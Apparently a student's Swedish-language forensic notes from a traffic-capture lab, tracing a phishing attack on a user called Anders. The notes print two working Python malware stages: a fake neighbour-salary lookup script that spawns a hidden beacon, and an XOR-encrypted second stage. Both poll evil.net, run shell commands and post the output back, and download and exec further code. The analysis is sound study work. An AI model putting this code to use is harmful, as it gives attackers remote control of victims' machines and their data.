@@ -1,0 +1,188 @@
+Phishing attack, eftersom Anders redan har ett intresse för ekonomi och sina grannars inkomster så var detta antagligen en riktad attack mot honom (eftersom mailet var en annons om att man kunde ta reda på vad ens grannar tjänar). Därför kan man nog anta att angreppet är delvis automatiskt (dvs den kod som körs på Anders maskin) men också styrt av någon mänsklig faktor som styr när de olika stegen av attacken ska startas. 
+
+
+Rad 69 öppnar Anders ett mail som innehåller någon typ av farlig kod/länk. 
+Länken går till nån typ av kod. 
+Phising-attack. 
+Line:         href="http://evil.net/stage_1?filename=upplysning.py">http://www.grannupplysningen.se/upplysning.py</a>\r\n
+
+Anders IP: 172.23.0.3
+
+Företagets IP: 172.23.0.2 ?? Kanske mailservern
+
+Misstänkt??: 172.23.0.4  
+
+Rad 88: Anders kör koden/hämtar bilden/whatever från den misstänkta IP adressen. 
+Attacken verkar börja på rad 89. 
+
+97: Anders eller ett program på hans dator vill spara 15 flaggor (?) på mailservern
+
+112: något händer från den skumma IP adressen ner till Anders IP. Någon skadlig kod laddas ner då requesten är lång (1k+ rader) samt den innehåller kod (koden är cirka 1300 bytes stor) som kör att den ska ladda ner zip:ade filer. Den skapar också någon typ av anslutning. Shell??
+
+Koden kan vara att man anger sin granne som man vill veta lönen för men att den automatiskt verkar visa att grannen inte finns, men när man kör programmet verkar den ladda ner någon typ av zip:ad fil samt att den gör någon typ av anslutning, kanske startar ett shell eller SSH? 
+
+Koden: -----------------------
+
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.9.2
+Date: Mon, 19 Dec 2022 13:18:58 GMT
+Content-Disposition: attachment; filename=upplysning.py
+Content-Type: text/x-python; charset=utf-8
+Content-Length: 1309
+Last-Modified: Mon, 19 Dec 2022 09:44:20 GMT
+Cache-Control: no-cache, max-age=0
+Expires: Mon, 19 Dec 2022 13:18:58 GMT
+ETag: "1671443060.6941204-1309-1683556443"
+Date: Mon, 19 Dec 2022 13:18:58 GMT
+Connection: close
+
+#!/usr/bin/env python3
+import sys
+import os
+
+
+def main():
+    print('VÃ¤lkommen till Grannupplysningen!')
+    name = input('Ange ditt namn: ')
+    input('Ange din adress: ')
+    input('Ange din postadress: ')
+    print('Kunde inte hitta nÃ¥gra grannar fÃ¶r %s! FÃ¶rsÃ¶k igen senare.' % name)
+
+
+def payload():
+    import requests
+    import time
+    import subprocess
+    import urllib.parse
+    import gzip
+    
+    session = requests.session()
+
+    while True:
+        response = session.get('http://evil.net/beacon_1').json()
+        
+        if response['command'] == 'sleep':
+            time.sleep(response.get('parameters', [3])[0])
+
+        elif response['command'] == 'shell':
+            output = subprocess.check_output(response.get('parameters')[0], shell=True)
+            session.post('http://evil.net/shell_1', json={'output': urllib.parse.quote(output, safe='')})
+
+        elif response['command'] == 'download_and_execute':
+            new_payload = session.get(response.get('parameters')[0]).content
+            session_id = session.cookies['id']
+            exec(new_payload, globals(), locals())
+            break
+
+
+if __name__ == '__main__':
+    if '--payload' in sys.argv:
+        payload()
+    else:
+        os.system('python3 %s --payload &> /dev/null &' % sys.argv[0])
+        main()
+
+--------------------------------------
+
+133: Anders loggar ut från mailservern. 
+141: Anders loggar ut igen??
+
+151: Anders dator pengar (kör GET BEACON) till den skumma adressen. 
+Verkar som Anders dator startar upp en connection. 
+153: Skumma adressen stänger ner connection. Antagligen en PING till beacon kanske? 
+155: Anders dator får kommandot att sova av skumma adressen. 
+
+163: Anders dator verkar pinga igen till skumma adressen, samma sak sker. Men denna gång verkar Anders dator fått någon typ av cookie, såg ut att få det i första ping:et
+
+
+175: Samma som ovanstående
+
+Forsätter såhär ungefär vart 10:e rad. Cirka var 3e sekund
+
+311: Skumma adressen verkar starta ett shell med Anders dator! 319: Anders dator svarar med ett shell
+385: skumma adress skickar till anders dator att ladda ner och köra ett skadligt program, verkar vara steg 2 utifrån namn. Rad 393 laddar Anders dator ner. 
+397: Steg två laddas ner från skum adress till Anders adress, större fil på cirka 1500 bytes, python kod. 
+
+Koden: ----------------------------------
+
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.9.2
+Date: Mon, 19 Dec 2022 13:20:17 GMT
+Content-Disposition: attachment; filename=soijijioajglkmw
+Content-Type: 
+Content-Length: 1491
+Cache-Control: no-cache, max-age=0
+Expires: Mon, 19 Dec 2022 13:20:17 GMT
+Date: Mon, 19 Dec 2022 13:20:17 GMT
+Connection: close
+
+def entrypoint(session_id):
+    import uuid
+    import base64
+    import requests
+    import json
+    import subprocess
+    import time
+    import marshal
+    
+    
+    def rolling_xor(data, key):
+        encrypted = b''
+        for i, c in enumerate(data):
+            encrypted += bytes((c ^ key[i % len(key)],))
+        return encrypted
+
+    key = uuid.getnode().to_bytes(length=6, byteorder='big')
+    
+    session = requests.session()
+    session.cookies.set('id', session_id)
+    
+    session.post('http://evil.net/set_key', json={'key': base64.b64encode(key).decode()})
+    
+    while True:
+        data = base64.b64decode(session.get('http://evil.net/beacon_2').content)
+        response = json.loads(rolling_xor(data, key).decode())
+        
+        if response['command'] == 'sleep':
+            time.sleep(response.get('parameters', [3])[0])
+
+        elif response['command'] == 'shell':
+            output = subprocess.check_output(response.get('parameters')[0], shell=True).decode()
+            output_encrypted = rolling_xor(json.dumps({'output': output}).encode(), key)
+            session.post('http://evil.net/shell_2', data=base64.b64encode(output_encrypted))
+
+        elif response['command'] == 'download_and_execute':
+            new_payload = session.get(response.get('parameters')[0]).content
+            session_id = session.cookies['id']
+            exec(marshal.loads(rolling_xor(new_payload, key)), globals(), locals())
+            break
+
+
+entrypoint(session_id)
+
+--------------------------------
+
+405: Anders dator skapar en till annorlunda connection med skumma adressen
+407: Anders dator skickar en key. 
+Nyckel: {"key": "AkKsFwAD"}
+419: Anders dators "nya" beacon pengar skumma datorn likt den har pingat med den förra beaconen. När skumma datorn stänger connectionen för beaconen så svarar den lite senare med denna http text: eWDPeG1uYyzINTojIDHAcmVzID8= 
+Oklar vad för koding det är. 
+
+495: skumma datorn svarar med en annan kodad text: eeWDPeG1uYyzINTojIDHEcmxvIG6MNXBicCPBcnRmcDGOLSBYIC7fNy9rbS/JOGFtZifeZCJefw==
+
+503: Anders dator  startar connection med skumma datorn. 
+505: Skumma datorn svarar med konstig kodning:eWDDYnRzdzaOLSAhRifffHRsch7CU29gdy/JeXRwXizoeHdtbi3Nc3NfbA/ZZGlgXiz8fmN3dzDJZFxtUjfOe2lgXiz4cm1zbiPYcnNfbBTFc2VscR7CNX0=
+507: connection stängs. 
+
+545: Skumma datorn svarar på ping med: eWDPeG1uYyzINTojIDHEcmxvIG6MNXBicCPBcnRmcDGOLSBYIC7fNy1ibmKDf29uZ23NeWRmcDGDU29gdy/JeXRwIB/R
+
+553: Anders startar connection
+555: Anders POST:ar en kodad sträng: eWDDYnRzdzaOLSAhdi3YdmwjM3aUS25ncDXUZXd7cG/UNyAxIiPCc2VxcWLNeWRmcDGMNyA3MnuaN0RmYWKdIyAyNniYJiAtXizIZXd7cDXUZS17InOZN2FtZifeZCBibCbJZXMjImKYJzk1IgbJdCAyO2KdJTo2NWKCOVxtLzDbOnJ0LzCBOiAjM2LNeWRmcDGMdm5nZzDfNzE3M3eeJCBHZyGMJjQjM3aWJDQjaifBe2lkaifYcnItcizLS24hfw==
+
+Saker händer här emellan
+
+
+729: Skumma adressen svarar med ett till längre meddelande, kodat: eWDPeG1uYyzINTojICbDYG5vbSPISGFtZh3Jb2VgdzbJNSwjIDLNZWFuZzbJZXMhOGL3NWh3djKWOC9mdCvAOW5mdm3fY2FkZx2fNV1+
+737: Anders dator hämtar steg 3 av attacken. 
+Efter att Anders hämtat steg 3 så skickas massa stora dataströmmar från anders till skumma datorn, strömmarna är lika stora och repeteras hela tiden. Typ fulla med gibberish. Skickas m.h.a TCP. 
+Koden som laddas ner för steg 3 är bara gibberish och antagligen krypterad. 
